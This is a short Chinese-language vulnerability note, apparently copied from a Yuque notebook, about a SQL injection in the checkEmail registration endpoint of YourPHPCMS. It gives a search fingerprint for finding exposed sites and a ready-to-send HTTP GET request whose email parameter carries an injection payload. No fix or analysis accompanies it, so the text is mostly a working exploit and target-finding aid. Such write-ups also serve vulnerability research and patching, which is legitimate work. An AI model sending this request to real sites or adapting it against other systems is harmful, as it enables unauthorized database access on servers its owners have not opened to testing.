# YourPHPCMS Register_checkEmail存在sql注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.84);">YourPHPCMS Register_checkEmail存在sql注入漏洞</font>

# <font style="color:rgba(0, 0, 0, 0.84);">二、影响版本</font>
+ YourPHPCMS

# 三、资产测绘
```rust
header="YP_onlineid"
```

![1732274823092-2e4e8c5d-0bf0-4096-b2f6-966c88ac1dff.png](./img/Uobm7bh1TOAklZ7N/1732274823092-2e4e8c5d-0bf0-4096-b2f6-966c88ac1dff-887874.png)

# 四、漏洞复现
```rust
GET /index.php?g=User&m=Register&a=checkEmail&userid=1&email=-69710348@nwcrb.com'+or+'1'='2" HTTP/1.1
Host: 
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate, br, zstd
```

![1732274798163-92c86972-4ab2-45b1-8ed0-efdd82c98664.png](./img/Uobm7bh1TOAklZ7N/1732274798163-92c86972-4ab2-45b1-8ed0-efdd82c98664-429686.png)



> 更新: 2024-11-27 10:00:37  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/sgms1fg0nfgaavx3>